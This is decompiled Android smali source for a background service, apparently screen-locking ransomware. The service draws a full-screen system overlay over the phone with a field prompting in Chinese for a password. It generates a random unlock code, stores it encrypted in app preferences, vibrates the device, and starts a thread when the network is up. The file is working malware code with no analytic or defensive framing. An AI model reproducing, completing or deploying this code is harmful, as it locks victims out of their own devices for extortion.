.class public Lcom/sssp/s;
.super Landroid/app/Service;
.source "s.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/sssp/s$100000000;,
        Lcom/sssp/s$100000001;
    }
.end annotation


# instance fields
.field bt:Landroid/widget/Button;

.field des:Lcom/sssp/DU;

.field ed:Landroid/widget/EditText;

.field editor:Landroid/content/SharedPreferences$Editor;

.field private mFloatLayout:Landroid/view/View;

.field private mWindowManager:Landroid/view/WindowManager;

.field pass:J

.field passw:Ljava/lang/Long;

.field password:Ljava/lang/String;

.field ppss:Ljava/lang/String;

.field share:Landroid/content/SharedPreferences;

.field tv:Landroid/widget/TextView;

.field private wmParams:Landroid/view/WindowManager$LayoutParams;


# direct methods
.method public constructor <init>()V
    .locals 3

    .prologue
    .line 220
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$L1000001(Lcom/sssp/s;)Landroid/view/WindowManager;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/sssp/s;->mWindowManager:Landroid/view/WindowManager;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$L1000002(Lcom/sssp/s;)Landroid/view/View;
    .locals 4

    move-object v0, p0

    move-object v3, v0

    iget-object v3, v3, Lcom/sssp/s;->mFloatLayout:Landroid/view/View;

    move-object v0, v3

    return-object v0
.end method

.method static synthetic access$S1000001(Lcom/sssp/s;Landroid/view/WindowManager;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/sssp/s;->mWindowManager:Landroid/view/WindowManager;

    return-void
.end method

.method static synthetic access$S1000002(Lcom/sssp/s;Landroid/view/View;)V
    .locals 6

    move-object v0, p0

    move-object v1, p1

    move-object v4, v0

    move-object v5, v1

    iput-object v5, v4, Lcom/sssp/s;->mFloatLayout:Landroid/view/View;

    return-void
.end method

.method private c()V
    .locals 13
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 128
    move-object v0, p0

    move-object v8, v0

    new-instance v9, Landroid/view/WindowManager$LayoutParams;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    invoke-direct {v10}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    iput-object v9, v8, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    .line 130
    move-object v8, v0

    move-object v9, v0

    invoke-virtual {v9}, Lcom/sssp/s;->getApplication()Landroid/app/Application;

    move-result-object v9

    move-object v10, v0

    invoke-virtual {v10}, Lcom/sssp/s;->getApplication()Landroid/app/Application;

    move-result-object v10

    sget-object v10, Landroid/content/Context;->WINDOW_SERVICE:Ljava/lang/String;

    invoke-virtual {v9, v10}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Landroid/view/WindowManager;

    iput-object v9, v8, Lcom/sssp/s;->mWindowManager:Landroid/view/WindowManager;

    .line 133
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v9, 0x7da

    iput v9, v8, Landroid/view/WindowManager$LayoutParams;->type:I

    .line 141
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v9, 0x1

    iput v9, v8, Landroid/view/WindowManager$LayoutParams;->format:I

    .line 147
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v9, 0x500

    iput v9, v8, Landroid/view/WindowManager$LayoutParams;->flags:I

    .line 154
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/16 v9, 0x31

    iput v9, v8, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 156
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v9, 0x0

    iput v9, v8, Landroid/view/WindowManager$LayoutParams;->x:I

    .line 157
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v9, 0x0

    iput v9, v8, Landroid/view/WindowManager$LayoutParams;->y:I

    .line 159
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v9, -0x1

    iput v9, v8, Landroid/view/ViewGroup$LayoutParams;->width:I

    .line 160
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    const/4 v9, -0x1

    iput v9, v8, Landroid/view/ViewGroup$LayoutParams;->height:I

    .line 165
    move-object v8, v0

    invoke-virtual {v8}, Lcom/sssp/s;->getApplication()Landroid/app/Application;

    move-result-object v8

    invoke-static {v8}, Landroid/view/LayoutInflater;->from(Landroid/content/Context;)Landroid/view/LayoutInflater;

    move-result-object v8

    move-object v2, v8

    .line 167
    move-object v8, v0

    move-object v9, v2

    const v10, 0x7f030001

    const/4 v11, 0x0

    check-cast v11, Landroid/view/ViewGroup;

    invoke-virtual {v9, v10, v11}, Landroid/view/LayoutInflater;->inflate(ILandroid/view/ViewGroup;)Landroid/view/View;

    move-result-object v9

    iput-object v9, v8, Lcom/sssp/s;->mFloatLayout:Landroid/view/View;

    .line 171
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->mWindowManager:Landroid/view/WindowManager;

    move-object v9, v0

    iget-object v9, v9, Lcom/sssp/s;->mFloatLayout:Landroid/view/View;

    move-object v10, v0

    iget-object v10, v10, Lcom/sssp/s;->wmParams:Landroid/view/WindowManager$LayoutParams;

    invoke-interface {v8, v9, v10}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 172
    move-object v8, v0

    move-object v9, v0

    iget-object v9, v9, Lcom/sssp/s;->mFloatLayout:Landroid/view/View;

    const v10, 0x7f0a0002

    invoke-virtual {v9, v10}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v9

    check-cast v9, Landroid/widget/Button;

    iput-object v9, v8, Lcom/sssp/s;->bt:Landroid/widget/Button;

    .line 173
    move-object v8, v0

    move-object v9, v0

    iget-object v9, v9, Lcom/sssp/s;->mFloatLayout:Landroid/view/View;

    const v10, 0x7f0a0001

    invoke-virtual {v9, v10}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v9

    check-cast v9, Landroid/widget/EditText;

    iput-object v9, v8, Lcom/sssp/s;->ed:Landroid/widget/EditText;

    .line 174
    move-object v8, v0

    move-object v9, v0

    iget-object v9, v9, Lcom/sssp/s;->mFloatLayout:Landroid/view/View;

    const/high16 v10, 0x7f0a0000

    invoke-virtual {v9, v10}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v9

    check-cast v9, Landroid/widget/TextView;

    iput-object v9, v8, Lcom/sssp/s;->tv:Landroid/widget/TextView;

    .line 175
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->bt:Landroid/widget/Button;

    new-instance v9, Lcom/sssp/s$100000001;

    move-object v12, v9

    move-object v9, v12

    move-object v10, v12

    move-object v11, v0

    invoke-direct {v10, v11}, Lcom/sssp/s$100000001;-><init>(Lcom/sssp/s;)V

    invoke-virtual {v8, v9}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 196
    move-object v8, v0

    :try_start_0
    iget-object v8, v8, Lcom/sssp/s;->ed:Landroid/widget/EditText;

    const-string v9, "\u8fd9\u91cc\u8f93\u5165\u5bc6\u7801"

    invoke-virtual {v8, v9}, Landroid/widget/EditText;->setHint(Ljava/lang/CharSequence;)V

    .line 197
    move-object v8, v0

    invoke-virtual {v8}, Lcom/sssp/s;->getResources()Landroid/content/res/Resources;

    move-result-object v8

    const/high16 v9, 0x7f060000

    invoke-virtual {v8, v9}, Landroid/content/res/Resources;->openRawResource(I)Ljava/io/InputStream;

    move-result-object v8

    move-object v3, v8

    .line 198
    move-object v8, v3

    invoke-static {v8}, Lcom/sssp/BAH;->getString(Ljava/io/InputStream;)Ljava/lang/String;

    move-result-object v8

    move-object v4, v8

    .line 199
    move-object v8, v4

    const-string v9, "\n"

    const-string v10, ""

    invoke-virtual {v8, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    move-object v5, v8

    .line 200
    move-object v8, v5

    invoke-static {v8}, Lcom/sssp/M;->getsss(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    move-object v6, v8

    .line 201
    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->tv:Landroid/widget/TextView;

    move-object v9, v6

    invoke-virtual {v8, v9}, Landroid/widget/TextView;->append(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v8

    move-object v3, v8

    goto :goto_0
.end method


# virtual methods
.method public is(Landroid/content/Context;)Z
    .locals 8

    .prologue
    .line 209
    move-object v0, p0

    move-object v1, p1

    move-object v6, v1

    if-eqz v6, :cond_0

    .line 211
    move-object v6, v1

    const-string v7, "connectivity"

    invoke-virtual {v6, v7}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/net/ConnectivityManager;

    move-object v3, v6

    .line 213
    move-object v6, v3

    invoke-virtual {v6}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v6

    move-object v4, v6

    .line 214
    move-object v6, v4

    if-eqz v6, :cond_0

    .line 216
    move-object v6, v4

    invoke-virtual {v6}, Landroid/net/NetworkInfo;->isAvailable()Z

    move-result v6

    move v0, v6

    .line 219
    :goto_0
    return v0

    :cond_0
    const/4 v6, 0x0

    move v0, v6

    goto :goto_0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 4
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 35
    move-object v0, p0

    move-object v1, p1

    const/4 v3, 0x0

    check-cast v3, Landroid/os/IBinder;

    move-object v0, v3

    return-object v0
.end method

.method public onCreate()V
    .locals 14
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    move-object v0, p0

    move-object v5, v0

    const-string v6, "com.aide.ui"

    invoke-static {v5, v6}, Ladrt/ADRTLogCatReader;->onContext(Landroid/content/Context;Ljava/lang/String;)V

    .line 42
    move-object v5, v0

    invoke-super {v5}, Landroid/app/Service;->onCreate()V

    .line 43
    move-object v5, v0

    invoke-static {}, Ljava/lang/Math;->random()D

    move-result-wide v6

    const/4 v8, 0x1

    int-to-double v8, v8

    add-double/2addr v6, v8

    double-to-long v6, v6

    const v8, 0x989680

    int-to-long v8, v8

    mul-long/2addr v6, v8

    iput-wide v6, v5, Lcom/sssp/s;->pass:J

    .line 44
    move-object v5, v0

    move-object v6, v0

    iget-wide v6, v6, Lcom/sssp/s;->pass:J

    const/16 v8, 0x3f2

    int-to-long v8, v8

    add-long/2addr v6, v8

    new-instance v8, Ljava/lang/Long;

    move-wide v11, v6

    move-object v13, v8

    move-object v6, v13

    move-wide v7, v11

    move-object v9, v13

    move-wide v11, v7

    move-object v13, v9

    move-object v7, v13

    move-wide v8, v11

    move-object v10, v13

    invoke-direct {v7, v8, v9}, Ljava/lang/Long;-><init>(J)V

    iput-object v6, v5, Lcom/sssp/s;->passw:Ljava/lang/Long;

    .line 46
    move-object v5, v0

    new-instance v6, Lcom/sssp/DU;

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    const-string v8, "bah"

    invoke-direct {v7, v8}, Lcom/sssp/DU;-><init>(Ljava/lang/String;)V

    iput-object v6, v5, Lcom/sssp/s;->des:Lcom/sssp/DU;

    .line 49
    move-object v5, v0

    :try_start_0
    new-instance v6, Lcom/sssp/DU;

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    move-object v8, v0

    iget-object v8, v8, Lcom/sssp/s;->des:Lcom/sssp/DU;

    const-string v9, "c29fe56fa59ab0db"

    invoke-virtual {v8, v9}, Lcom/sssp/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-direct {v7, v8}, Lcom/sssp/DU;-><init>(Ljava/lang/String;)V

    iput-object v6, v5, Lcom/sssp/s;->des:Lcom/sssp/DU;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 53
    :goto_0
    move-object v5, v0

    move-object v6, v0

    const-string v7, "bah"

    const/4 v8, 0x0

    invoke-virtual {v6, v7, v8}, Lcom/sssp/s;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v6

    iput-object v6, v5, Lcom/sssp/s;->share:Landroid/content/SharedPreferences;

    .line 54
    move-object v5, v0

    move-object v6, v0

    iget-object v6, v6, Lcom/sssp/s;->share:Landroid/content/SharedPreferences;

    invoke-interface {v6}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v6

    iput-object v6, v5, Lcom/sssp/s;->editor:Landroid/content/SharedPreferences$Editor;

    .line 56
    move-object v5, v0

    invoke-virtual {v5}, Lcom/sssp/s;->getApplication()Landroid/app/Application;

    move-result-object v5

    const-string v6, "vibrator"

    invoke-virtual {v5, v6}, Landroid/app/Application;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/os/Vibrator;

    move-object v2, v5

    .line 59
    move-object v5, v2

    const/4 v6, 0x4

    new-array v6, v6, [J

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    const/4 v8, 0x0

    const/16 v9, 0x64

    int-to-long v9, v9

    aput-wide v9, v7, v8

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    const/4 v8, 0x1

    const/16 v9, 0x5dc

    int-to-long v9, v9

    aput-wide v9, v7, v8

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    const/4 v8, 0x2

    const/16 v9, 0x64

    int-to-long v9, v9

    aput-wide v9, v7, v8

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    const/4 v8, 0x3

    const/16 v9, 0x5dc

    int-to-long v9, v9

    aput-wide v9, v7, v8

    const/4 v7, 0x0

    invoke-virtual {v5, v6, v7}, Landroid/os/Vibrator;->vibrate([JI)V

    .line 60
    move-object v5, v0

    iget-object v5, v5, Lcom/sssp/s;->share:Landroid/content/SharedPreferences;

    const-string v6, "m"

    const/4 v7, 0x0

    int-to-long v7, v7

    invoke-interface {v5, v6, v7, v8}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v5

    const/4 v7, 0x0

    int-to-long v7, v7

    cmp-long v5, v5, v7

    if-nez v5, :cond_0

    .line 63
    move-object v5, v0

    iget-object v5, v5, Lcom/sssp/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v6, "m"

    move-object v7, v0

    iget-wide v7, v7, Lcom/sssp/s;->pass:J

    invoke-interface {v5, v6, v7, v8}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    .line 64
    move-object v5, v0

    iget-object v5, v5, Lcom/sssp/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v5}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v5

    .line 67
    move-object v5, v0

    :try_start_1
    iget-object v5, v5, Lcom/sssp/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v6, "passw"

    move-object v7, v0

    iget-object v7, v7, Lcom/sssp/s;->des:Lcom/sssp/DU;

    new-instance v8, Ljava/lang/StringBuffer;

    move-object v11, v8

    move-object v8, v11

    move-object v9, v11

    invoke-direct {v9}, Ljava/lang/StringBuffer;-><init>()V

    const-string v9, ""

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v8

    move-object v9, v0

    iget-object v9, v9, Lcom/sssp/s;->passw:Ljava/lang/Long;

    invoke-virtual {v8, v9}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Lcom/sssp/DU;->encrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    .line 68
    move-object v5, v0

    iget-object v5, v5, Lcom/sssp/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v5}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    move-result v5

    .line 72
    :goto_1
    move-object v5, v0

    move-object v6, v0

    invoke-virtual {v6}, Lcom/sssp/s;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    invoke-virtual {v5, v6}, Lcom/sssp/s;->is(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 74
    move-object v5, v0

    new-instance v6, Ljava/lang/StringBuffer;

    move-object v11, v6

    move-object v6, v11

    move-object v7, v11

    invoke-direct {v7}, Ljava/lang/StringBuffer;-><init>()V

    move-object v7, v0

    iget-object v7, v7, Lcom/sssp/s;->share:Landroid/content/SharedPreferences;

    const-string v8, "m"

    const/16 v9, 0x8

    int-to-long v9, v9

    invoke-interface {v7, v8, v9, v10}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v7

    invoke-virtual {v6, v7, v8}, Ljava/lang/StringBuffer;->append(J)Ljava/lang/StringBuffer;

    move-result-object v6

    const-string v7, ""

    invoke-virtual {v6, v7}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/sssp/s;->ppss:Ljava/lang/String;

    .line 77
    move-object v5, v0

    move-object v6, v0

    :try_start_2
    iget-object v6, v6, Lcom/sssp/s;->des:Lcom/sssp/DU;

    move-object v7, v0

    iget-object v7, v7, Lcom/sssp/s;->share:Landroid/content/SharedPreferences;

    const-string v8, "passw"

    const-string v9, ""

    invoke-interface {v7, v8, v9}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lcom/sssp/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    iput-object v6, v5, Lcom/sssp/s;->password:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 81
    :goto_2
    new-instance v5, Lcom/sssp/s$100000000;

    move-object v11, v5

    move-object v5, v11

    move-object v6, v11

    move-object v7, v0

    invoke-direct {v6, v7}, Lcom/sssp/s$100000000;-><init>(Lcom/sssp/s;)V

    invoke-virtual {v5}, Lcom/sssp/s$100000000;->start()V

    .line 101
    :cond_0
    :goto_3
    return-void

    .line 49
    :catch_0
    move-exception v5

    move-object v2, v5

    goto/16 :goto_0

    .line 68
    :catch_1
    move-exception v5

    move-object v3, v5

    goto :goto_1

    .line 77
    :catch_2
    move-exception v5

    move-object v3, v5

    goto :goto_2

    .line 98
    :cond_1
    move-object v5, v0

    :try_start_3
    iget-object v5, v5, Lcom/sssp/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v6, "m"

    move-object v7, v0

    iget-object v7, v7, Lcom/sssp/s;->des:Lcom/sssp/DU;

    const-string v8, "sssp"

    invoke-virtual {v7, v8}, Lcom/sssp/DU;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Ljava/lang/Long;->parseLong(Ljava/lang/String;)J

    move-result-wide v7

    invoke-interface {v5, v6, v7, v8}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    .line 99
    move-object v5, v0

    iget-object v5, v5, Lcom/sssp/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v5}, Landroid/content/SharedPreferences$Editor;->commit()Z

    move-result v5

    .line 100
    move-object v5, v0

    iget-object v5, v5, Lcom/sssp/s;->editor:Landroid/content/SharedPreferences$Editor;

    const-string v6, "passw"

    const-string v7, "bahk"

    invoke-interface {v5, v6, v7}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    move-result-object v5

    .line 101
    move-object v5, v0

    iget-object v5, v5, Lcom/sssp/s;->editor:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v5}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    move-result v5

    goto :goto_3

    :catch_3
    move-exception v5

    move-object v3, v5

    goto :goto_3
.end method

.method public onStart(Landroid/content/Intent;I)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Intent;",
            "I)V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 113
    move-object v0, p0

    move-object v1, p1

    move v2, p2

    move-object v4, v0

    move-object v5, v1

    move v6, v2

    invoke-super {v4, v5, v6}, Landroid/app/Service;->onStart(Landroid/content/Intent;I)V

    .line 114
    move-object v4, v0

    invoke-direct {v4}, Lcom/sssp/s;->c()V

    return-void
.end method
